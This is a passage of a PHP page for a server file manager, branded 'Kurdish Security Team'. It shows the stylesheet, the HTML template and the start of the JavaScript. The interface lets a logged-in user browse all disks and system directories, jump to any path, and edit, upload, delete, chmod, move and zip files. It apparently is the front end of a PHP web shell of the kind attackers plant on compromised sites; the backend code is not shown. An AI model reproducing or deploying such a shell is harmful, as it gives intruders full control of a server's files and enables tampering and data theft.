            color: var(--text-primary);
            border-radius: 8px;
        }

        .form-control:focus, .form-select:focus {
            background: var(--bg-secondary);
            border-color: var(--primary);
            color: var(--text-primary);
            box-shadow: 0 0 0 0.25rem rgba(102, 126, 234, 0.25);
        }

        .upload-zone {
            border: 2px dashed var(--border-color);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            background: var(--bg-secondary);
            transition: all 0.3s ease;
        }

        .upload-zone:hover, .upload-zone.dragover {
            border-color: var(--primary);
            background: var(--hover-bg);
        }

        .upload-zone i {
            font-size: 3rem;
            color: var(--text-secondary);
            margin-bottom: 15px;
        }

        .preview-image {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 8px;
        }

        .preview-video {
            max-width: 100%;
            border-radius: 8px;
        }

        .code-preview {
            max-height: 70vh;
            overflow: auto;
            border-radius: 8px;
        }

        .badge {
            padding: 5px 10px;
            border-radius: 6px;
            font-weight: 500;
        }

        @media (max-width: 768px) {
            .table {
                font-size: 0.75rem;
            }
            
            .hide-mobile {
                display: none !important;
            }

            .action-btn {
                padding: 4px 8px;
                font-size: 0.7rem;
            }

            .toolbar {
                gap: 5px;
            }
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .toast-container {
            position: fixed;
            top: 80px;
            right: 20px;
            z-index: 9999;
        }

        .sortable-header {
            cursor: pointer;
            user-select: none;
        }

        .sortable-header:hover {
            opacity: 0.8;
        }

        .sort-icon {
            font-size: 0.8rem;
            margin-left: 5px;
        }

        .sidebar {
            position: sticky;
            top: 80px;
            max-height: calc(100vh - 100px);
            overflow-y: auto;
        }

        .disk-item {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 10px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .disk-item:hover {
            background: var(--hover-bg);
            border-color: var(--primary);
        }

        .disk-item.active {
            border-color: var(--primary);
            background: rgba(102, 126, 234, 0.1);
        }

        .quick-access-item {
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 5px;
            color: var(--text-primary);
            text-decoration: none;
        }

        .quick-access-item:hover {
            background: var(--hover-bg);
            color: var(--primary);
        }

        .path-input-group {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .path-input-group input {
            flex: 1;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 8px 12px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
        }

        .sidebar-section {
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 2px solid var(--border-color);
        }

        .sidebar-section:last-child {
            border-bottom: none;
        }

        .sidebar-title {
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sidebar-title i {
            font-size: 1rem;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container-fluid">
            <a class="navbar-brand" href="?dir=<?php echo urlencode(__DIR__); ?>">
                <i class="fas fa-folder-tree"></i> <?php echo $t['title']; ?>
            </a>
            <div class="d-flex align-items-center gap-2">
                <button class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
                    <i class="fas fa-moon" id="themeIcon"></i>
                </button>
                <form method="post" class="d-inline">
                    <select name="lang" class="form-select lang-select" onchange="this.form.submit()">
                        <option value="tr" <?php echo $lang === 'tr' ? 'selected' : ''; ?>>TR</option>
                        <option value="ku" <?php echo $lang === 'ku' ? 'selected' : ''; ?>>KU</option>
                    </select>
                </form>
                <form method="post" class="d-inline">
                    <button type="submit" name="logout" class="btn btn-danger btn-sm">
                        <i class="fas fa-sign-out-alt"></i>
                    </button>
                </form>
            </div>
        </div>
    </nav>

    <div class="container-fluid px-3">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-3 col-lg-2 d-none d-md-block sidebar">
                <!-- Quick Access -->
                <div class="sidebar-section">
                    <div class="sidebar-title">
                        <i class="fas fa-star"></i>
                        <?php echo $t['quick_access']; ?>
                    </div>
                    <?php foreach ($quick_access as $folder): ?>
                        <a href="?dir=<?php echo urlencode($folder['path']); ?>" class="quick-access-item">
                            <i class="fas <?php echo $folder['icon']; ?>"></i>
                            <span><?php echo $folder['name']; ?></span>
                        </a>
                    <?php endforeach; ?>
                </div>

                <!-- Available Disks -->
                <div class="sidebar-section">
                    <div class="sidebar-title">
                        <i class="fas fa-hdd"></i>
                        <?php echo $t['available_disks']; ?>
                    </div>
                    <?php foreach ($available_disks as $disk): ?>
                        <a href="?dir=<?php echo urlencode($disk['path']); ?>" 
                           class="disk-item <?php echo (strpos($current_dir, $disk['path']) === 0) ? 'active' : ''; ?>"
                           style="text-decoration: none;">
                            <div class="d-flex justify-content-between align-items-center mb-1">
                                <strong><i class="fas fa-hard-drive me-2"></i><?php echo htmlspecialchars($disk['name']); ?></strong>
                                <span class="badge bg-primary"><?php echo round(($disk['used'] / $disk['total']) * 100); ?>%</span>
                            </div>
                            <div class="progress" style="height: 4px;">
                                <div class="progress-bar" style="width: <?php echo round(($disk['used'] / $disk['total']) * 100); ?>%"></div>
                            </div>
                            <small class="text-muted d-block mt-1" style="font-size: 0.75rem;">
                                <?php echo format_size($disk['free']); ?> / <?php echo format_size($disk['total']); ?>
                            </small>
                        </a>
                    <?php endforeach; ?>
                </div>

                <!-- System Directories -->
                <?php if (!empty($system_directories)): ?>
                <div class="sidebar-section">
                    <div class="sidebar-title">
                        <i class="fas fa-folder-tree"></i>
                        <?php echo $t['system_directories']; ?>
                    </div>
                    <?php foreach ($system_directories as $dir): ?>
                        <a href="?dir=<?php echo urlencode($dir['path']); ?>" class="quick-access-item">
                            <i class="fas <?php echo $dir['icon']; ?>"></i>
                            <span><?php echo $dir['name']; ?></span>
                        </a>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
            </div>

            <!-- Main Content -->
            <div class="col-md-9 col-lg-10">
        <div class="main-container">
            
            <!-- Disk Usage -->
            <div class="disk-usage-card">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <h6 class="mb-0"><i class="fas fa-hard-drive me-2"></i><?php echo $t['disk_usage']; ?></h6>
                    <span class="badge bg-primary"><?php echo $disk_usage['percentage']; ?>%</span>
                </div>
                <div class="disk-usage-bar">
                    <div class="disk-usage-fill" style="width: <?php echo $disk_usage['percentage']; ?>%"></div>
                </div>
                <div class="d-flex justify-content-between small text-secondary">
                    <span><?php echo format_size($disk_usage['used']); ?> kullanılan</span>
                    <span><?php echo format_size($disk_usage['total']); ?> toplam</span>
                </div>
            </div>

            <!-- Alerts -->
            <?php if (isset($_SESSION['error'])): ?>
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="fas fa-exclamation-circle me-2"></i><?php echo htmlspecialchars($_SESSION['error']); ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
            <?php unset($_SESSION['error']); endif; ?>

            <?php if (isset($_SESSION['success'])): ?>
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <i class="fas fa-check-circle me-2"></i><?php echo htmlspecialchars($_SESSION['success']); ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
            <?php unset($_SESSION['success']); endif; ?>

            <!-- Manual Path Input -->
            <div class="path-input-group">
                <i class="fas fa-folder-open" style="color: var(--text-secondary);"></i>
                <form method="get" style="flex: 1; display: flex; gap: 10px;">
                    <input type="text" name="dir" class="form-control" 
                           value="<?php echo htmlspecialchars($current_dir); ?>"
                           placeholder="<?php echo $t['current_path']; ?>"
                           title="<?php echo $t['go_to_path']; ?>">
                    <button type="submit" class="btn btn-primary btn-sm">
                        <i class="fas fa-arrow-right"></i> <?php echo $t['go_to_path']; ?>
                    </button>
                </form>
            </div>

            <!-- Breadcrumb -->
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb mb-0">
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo urlencode(__DIR__); ?>"><i class="fas fa-home"></i></a>
                    </li>
                    <?php
                    $parent_dir = normalize_path(dirname($current_dir));
                    if ($parent_dir !== $current_dir):
                    ?>
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo urlencode($parent_dir); ?>">
                            <i class="fas fa-arrow-left"></i> <?php echo $t['back']; ?>
                        </a>
                    </li>
                    <?php endif; ?>
                    <?php foreach ($breadcrumb as $crumb): ?>
                    <li class="breadcrumb-item <?php echo $crumb === end($breadcrumb) ? 'active' : ''; ?>">
                        <?php if ($crumb !== end($breadcrumb)): ?>
                        <a href="?dir=<?php echo urlencode($crumb['path']); ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                        <?php else: ?>
                        <?php echo htmlspecialchars($crumb['name']); ?>
                        <?php endif; ?>
                    </li>
                    <?php endforeach; ?>
                </ol>
            </nav>

            <!-- Toolbar -->
            <div class="toolbar">
                <div class="search-box">
                    <form method="get" class="d-flex">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                        <input type="text" name="search" class="form-control"
                               placeholder="<?php echo $t['search']; ?>"
                               value="<?php echo htmlspecialchars($search_query); ?>">
                    </form>
                </div>

                <div class="filter-buttons">
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=all" 
                       class="filter-btn <?php echo $filter_type === 'all' ? 'active' : ''; ?>">
                        <i class="fas fa-list"></i> <?php echo $t['all_files']; ?>
                    </a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=image" 
                       class="filter-btn <?php echo $filter_type === 'image' ? 'active' : ''; ?>">
                        <i class="fas fa-image"></i> <?php echo $t['images']; ?>
                    </a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=video" 
                       class="filter-btn <?php echo $filter_type === 'video' ? 'active' : ''; ?>">
                        <i class="fas fa-video"></i> <?php echo $t['videos']; ?>
                    </a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=document" 
                       class="filter-btn <?php echo $filter_type === 'document' ? 'active' : ''; ?>">
                        <i class="fas fa-file-alt"></i> <?php echo $t['documents']; ?>
                    </a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=archive" 
                       class="filter-btn <?php echo $filter_type === 'archive' ? 'active' : ''; ?>">
                        <i class="fas fa-file-zipper"></i> <?php echo $t['archives']; ?>
                    </a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&filter=code" 
                       class="filter-btn <?php echo $filter_type === 'code' ? 'active' : ''; ?>">
                        <i class="fas fa-code"></i> <?php echo $t['code']; ?>
                    </a>
                </div>

                <button class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#createModal">
                    <i class="fas fa-plus"></i> <?php echo $t['create']; ?>
                </button>
                <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#uploadModal">
                    <i class="fas fa-upload"></i> <?php echo $t['upload']; ?>
                </button>

                <div class="btn-group selection-buttons" style="display:none;">
                    <button class="btn btn-info" data-bs-toggle="modal" data-bs-target="#zipModal">
                        <i class="fas fa-file-zipper"></i> <?php echo $t['zip_create']; ?>
                    </button>
                    <button class="btn btn-primary" onclick="downloadZip()">
                        <i class="fas fa-download"></i> <?php echo $t['download']; ?>
                    </button>
                </div>

                <button class="btn btn-secondary selection-buttons" data-bs-toggle="modal" data-bs-target="#moveModal" style="display:none;">
                    <i class="fas fa-arrows-alt"></i> <?php echo $t['move']; ?>
                </button>
                <button class="btn btn-warning selection-buttons" data-bs-toggle="modal" data-bs-target="#copyModal" style="display:none;">
                    <i class="fas fa-copy"></i> <?php echo $t['copy']; ?>
                </button>
                <button class="btn btn-danger selection-buttons" onclick="deleteSelected()" style="display:none;">
                    <i class="fas fa-trash"></i> <?php echo $t['delete_selected']; ?>
                </button>
            </div>

            <!-- Files Table -->
            <div class="table-wrapper">
                <div style="overflow-x: auto;">
                    <table class="table table-hover mb-0">
                        <thead>
                            <tr>
                                <th style="width: 40px;"><input type="checkbox" id="selectAllCheckbox"></th>
                                <th style="width: 50px;"></th>
                                <th class="sortable-header">
                                    <a href="?dir=<?php echo urlencode($current_dir); ?>&sort=name&order=<?php echo ($sort === 'name' && $order === 'asc') ? 'desc' : 'asc'; ?><?php echo $search_query ? '&search=' . urlencode($search_query) : ''; ?><?php echo $filter_type !== 'all' ? '&filter=' . $filter_type : ''; ?>&page=<?php echo $page; ?>" style="color: white; text-decoration: none;">
                                        <?php echo $t['name']; ?>
                                        <?php if ($sort === 'name'): ?>
                                            <i class="fas fa-sort-<?php echo $order === 'asc' ? 'up' : 'down'; ?> sort-icon"></i>
                                        <?php endif; ?>
                                    </a>
                                </th>
                                <th class="sortable-header hide-mobile" style="width: 120px;">
                                    <a href="?dir=<?php echo urlencode($current_dir); ?>&sort=size&order=<?php echo ($sort === 'size' && $order === 'asc') ? 'desc' : 'asc'; ?><?php echo $search_query ? '&search=' . urlencode($search_query) : ''; ?><?php echo $filter_type !== 'all' ? '&filter=' . $filter_type : ''; ?>&page=<?php echo $page; ?>" style="color: white; text-decoration: none;">
                                        <?php echo $t['size']; ?>
                                        <?php if ($sort === 'size'): ?>
                                            <i class="fas fa-sort-<?php echo $order === 'asc' ? 'up' : 'down'; ?> sort-icon"></i>
                                        <?php endif; ?>
                                    </a>
                                </th>
                                <th class="sortable-header hide-mobile" style="width: 150px;">
                                    <a href="?dir=<?php echo urlencode($current_dir); ?>&sort=modified&order=<?php echo ($sort === 'modified' && $order === 'asc') ? 'desc' : 'asc'; ?><?php echo $search_query ? '&search=' . urlencode($search_query) : ''; ?><?php echo $filter_type !== 'all' ? '&filter=' . $filter_type : ''; ?>&page=<?php echo $page; ?>" style="color: white; text-decoration: none;">
                                        <?php echo $t['modified']; ?>
                                        <?php if ($sort === 'modified'): ?>
                                            <i class="fas fa-sort-<?php echo $order === 'asc' ? 'up' : 'down'; ?> sort-icon"></i>
                                        <?php endif; ?>
                                    </a>
                                </th>
                                <th class="hide-mobile" style="width: 100px;"><?php echo $t['permissions']; ?></th>
                                <th style="width: 300px;"><?php echo $t['actions']; ?></th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($files_paginated as $file): 
                                $mime_info = $file['is_dir'] ? ['icon' => 'fa-folder', 'color' => '#ffc107'] : get_mime_icon('', $file['extension']);
                                $is_current_file = (normalize_path($file['path']) === normalize_path(__FILE__));
                            ?>
                            <tr class="<?php echo $is_current_file ? 'highlighted-file' : ''; ?>">
                                <td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($file['path']); ?>"></td>
                                <td>
                                    <i class="fas <?php echo $mime_info['icon']; ?> file-icon" style="color: <?php echo $mime_info['color']; ?>;"></i>
                                </td>
                                <td>
                                    <?php if ($file['is_dir']): ?>
                                        <a href="?dir=<?php echo urlencode($file['path']); ?>" class="file-name">
                                            <?php echo htmlspecialchars($file['name']); ?>
                                        </a>
                                    <?php else: ?>
                                        <?php 
                                        $extension = strtolower($file['extension']);
                                        $web_extensions = ['php', 'html', 'htm'];
                                        if (in_array($extension, $web_extensions)) {
                                            $file_url = get_file_url($file['path']);
                                            if ($file_url) {
                                                echo '<a href="' . htmlspecialchars($file_url) . '" target="_blank" class="file-name">' . htmlspecialchars($file['name']) . '</a>';
                                            } else {
                                                echo '<span class="file-name">' . htmlspecialchars($file['name']) . '</span>';
                                            }
                                        } else {
                                            echo '<span class="file-name" style="cursor: pointer;" onclick="previewFile(\'' . htmlspecialchars($file['path'], ENT_QUOTES) . '\', \'' . htmlspecialchars($file['name'], ENT_QUOTES) . '\', \'' . $file['category'] . '\')">' . htmlspecialchars($file['name']) . '</span>';
                                        }
                                        ?>
                                    <?php endif; ?>
                                </td>
                                <td class="hide-mobile"><?php echo $file['is_dir'] ? '-' : format_size($file['size']); ?></td>
                                <td class="hide-mobile" style="font-size: 0.8rem;"><?php echo date('d.m.Y H:i', $file['modified']); ?></td>
                                <td class="hide-mobile"><span class="badge bg-secondary"><?php echo $file['perms']; ?></span></td>
                                <td>
                                    <?php if (!$file['is_dir']): ?>
                                        <button class="btn btn-sm btn-outline-primary action-btn" onclick="editFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">
                                            <i class="fas fa-edit"></i>
                                        </button>
                                        <button class="btn btn-sm btn-outline-success action-btn" onclick="window.open('?action=download&file=<?php echo urlencode($file['path']); ?>', '_blank')">
                                            <i class="fas fa-download"></i>
                                        </button>
                                    <?php endif; ?>
                                    <button class="btn btn-sm btn-outline-info action-btn" onclick="renameFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file['name'], ENT_QUOTES); ?>')">
                                        <i class="fas fa-i-cursor"></i>
                                    </button>
                                    <button class="btn btn-sm btn-outline-warning action-btn hide-mobile" onclick="chmodFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file['perms'], ENT_QUOTES); ?>')">
                                        <i class="fas fa-lock"></i>
                                    </button>
                                    <?php if (!$file['is_dir'] && $file['extension'] === 'zip'): ?>
                                        <button class="btn btn-sm btn-outline-secondary action-btn" onclick="extractZip('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">
                                            <i class="fas fa-file-zipper"></i>
                                        </button>
                                    <?php endif; ?>
                                    <button class="btn btn-sm btn-outline-danger action-btn" onclick="deleteFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </td>
                            </tr>
                            <?php endforeach; ?>

                            <?php if (empty($files_paginated)): ?>
                            <tr>
                                <td colspan="7" class="text-center py-5">
                                    <i class="fas fa-folder-open" style="font-size: 3rem; opacity: 0.3;"></i>
                                    <p class="mt-3 text-muted"><?php echo $search_query || $filter_type !== 'all' ? 'Sonuç bulunamadı' : 'Klasör boş'; ?></p>
                                </td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Pagination -->
            <?php if ($total_pages > 1): ?>
            <div class="d-flex justify-content-center align-items-center gap-3 mt-3">
                <?php if ($page > 1): ?>
                <a href="?dir=<?php echo urlencode($current_dir); ?>&page=<?php echo $page - 1; ?><?php echo $search_query ? '&search=' . urlencode($search_query) : ''; ?><?php echo $filter_type !== 'all' ? '&filter=' . $filter_type : ''; ?>"
                   class="btn btn-secondary">
                    <i class="fas fa-chevron-left"></i> <?php echo $t['prev_page']; ?>
                </a>
                <?php endif; ?>

                <span class="badge bg-primary px-4 py-2" style="font-size: 0.9rem;">
                    <?php echo $t['page']; ?> <?php echo $page; ?> / <?php echo $total_pages; ?>
                </span>

                <?php if ($page < $total_pages): ?>
                <a href="?dir=<?php echo urlencode($current_dir); ?>&page=<?php echo $page + 1; ?><?php echo $search_query ? '&search=' . urlencode($search_query) : ''; ?><?php echo $filter_type !== 'all' ? '&filter=' . $filter_type : ''; ?>"
                   class="btn btn-secondary">
                    <?php echo $t['next_page']; ?> <i class="fas fa-chevron-right"></i>
                </a>
                <?php endif; ?>
            </div>
            <?php endif; ?>

            <div class="mt-3 text-center small text-muted">
                <?php echo $total_files; ?> <?php echo $t['file']; ?> · Kurdish Security Team
            </div>
        </div>
            </div>
        </div>
    </div>

    <!-- Create Modal -->
    <div class="modal fade" id="createModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><?php echo $t['create']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="create_folder">
                        <div class="mb-3">
                            <label class="form-label"><i class="fas fa-folder me-2"></i><?php echo $t['folder_name']; ?></label>
                            <input type="text" name="folder_name" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['create_folder']; ?></button>
                    </form>
                    <hr class="my-3">
                    <form method="post">
                        <input type="hidden" name="action" value="create_file">
                        <div class="mb-3">
                            <label class="form-label"><i class="fas fa-file me-2"></i><?php echo $t['file_name']; ?></label>
                            <input type="text" name="file_name" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['create_file']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-upload me-2"></i><?php echo $t['upload']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post" enctype="multipart/form-data" id="uploadForm">
                        <input type="hidden" name="action" value="upload">
                        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
                            <i class="fas fa-cloud-upload-alt d-block"></i>
                            <h5><?php echo $t['drag_drop']; ?></h5>
                            <input type="file" id="fileInput" name="files[]" multiple style="display: none;" onchange="handleFiles(this.files)">
                        </div>
                        <div id="fileList" class="mt-3"></div>
                        <button type="submit" class="btn btn-primary w-100 mt-3" id="uploadBtn" style="display: none;">
                            <i class="fas fa-upload me-2"></i><?php echo $t['upload']; ?>
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Edit Modal -->
    <div class="modal fade" id="editModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit me-2"></i><?php echo $t['edit_file']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post" id="editForm">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="file" id="editFilePath">
                        <textarea name="content" id="editFileContent" class="form-control" rows="25" style="font-family: 'Courier New', monospace; font-size: 0.9rem;"></textarea>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $t['close']; ?></button>
                    <button type="submit" form="editForm" class="btn btn-primary">
                        <i class="fas fa-save me-2"></i><?php echo $t['save']; ?>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Preview Modal -->
    <div class="modal fade" id="previewModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="previewTitle"><i class="fas fa-eye me-2"></i><?php echo $t['preview']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body text-center" id="previewBody">
                    <div class="loading"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
    <div class="modal fade" id="renameModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-i-cursor me-2"></i><?php echo $t['rename']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="rename">
                        <input type="hidden" name="old_name" id="renamePath">
                        <div class="mb-3">
                            <label class="form-label"><?php echo $t['new_name']; ?></label>
                            <input type="text" name="new_name" id="renameNewName" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['save']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div class="modal fade" id="chmodModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-lock me-2"></i><?php echo $t['chmod']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="chmod">
                        <input type="hidden" name="path" id="chmodPath">
                        <div class="mb-3">
                            <label class="form-label"><?php echo $t['permissions_code']; ?></label>
                            <input type="text" name="permissions" id="chmodPerms" class="form-control" pattern="[0-7]{3,4}" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['save']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Zip Modal -->
    <div class="modal fade" id="zipModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-file-zipper me-2"></i><?php echo $t['zip_files']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="create_zip">
                        <div id="zipFilesList"></div>
                        <div class="mb-3 mt-3">
                            <label class="form-label"><?php echo $t['zip_name']; ?></label>
                            <input type="text" name="zip_name" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['save']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Move Modal -->
    <div class="modal fade" id="moveModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-arrows-alt me-2"></i><?php echo $t['move']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="move">
                        <div id="moveFilesList"></div>
                        <div class="mb-3 mt-3">
                            <label class="form-label"><?php echo $t['destination']; ?></label>
                            <input type="text" name="destination" class="form-control" value="<?php echo htmlspecialchars($current_dir); ?>" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['save']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Copy Modal -->
    <div class="modal fade" id="copyModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-copy me-2"></i><?php echo $t['copy']; ?></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <input type="hidden" name="action" value="copy">
                        <div id="copyFilesList"></div>
                        <div class="mb-3 mt-3">
                            <label class="form-label"><?php echo $t['destination']; ?></label>
                            <input type="text" name="destination" class="form-control" value="<?php echo htmlspecialchars($current_dir); ?>" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100"><?php echo $t['save']; ?></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
    <script>
        // Theme toggle
        function toggleTheme() {
            const html = document.documentElement;
            const currentTheme = html.getAttribute('data-theme');
            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
            html.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
            
            const icon = document.getElementById('themeIcon');
            icon.className = newTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }

        // Load saved theme
        document.addEventListener('DOMContentLoaded', function() {
            const savedTheme = localStorage.getItem('theme') || 'light';
            document.documentElement.setAttribute('data-theme', savedTheme);
            document.getElementById('themeIcon').className = savedTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        });

        // Selection handling
        function updateSelectionButtons() {
            const selectedCount = document.querySelectorAll('.file-checkbox:checked').length;
            const buttons = document.querySelectorAll('.selection-buttons');
            buttons.forEach(btn => {
                btn.style.display = selectedCount > 0 ? '' : 'none';
            });
        }

        document.getElementById('selectAllCheckbox').addEventListener('change', function() {
            document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = this.checked);
            updateSelectionButtons();
        });

        document.querySelectorAll('.file-checkbox').forEach(cb => {
            cb.addEventListener('change', updateSelectionButtons);
        });

        function getSelectedFiles() {
            return Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
        }

        // File operations
        function editFile(path) {
            fetch('?action=get_content&file=' + encodeURIComponent(path))
                .then(response => response.text())
                .then(content => {
                    document.getElementById('editFilePath').value = path;
                    document.getElementById('editFileContent').value = content;
                    new bootstrap.Modal(document.getElementById('editModal')).show();
                })
                .catch(error => alert('Error: ' + error));
        }

        function previewFile(path, name, category) {
            const modal = new bootstrap.Modal(document.getElementById('previewModal'));
            const body = document.getElementById('previewBody');
            const title = document.getElementById('previewTitle');
            
            title.innerHTML = '<i class="fas fa-eye me-2"></i>' + name;
            body.innerHTML = '<div class="loading"></div>';
            modal.show();

            if (category === 'image') {
                body.innerHTML = '<img src="?action=view&file=' + encodeURIComponent(path) + '" class="preview-image" alt="' + name + '">';
            } else if (category === 'video') {
                body.innerHTML = '<video controls class="preview-video"><source src="?action=view&file=' + encodeURIComponent(path) + '"></video>';
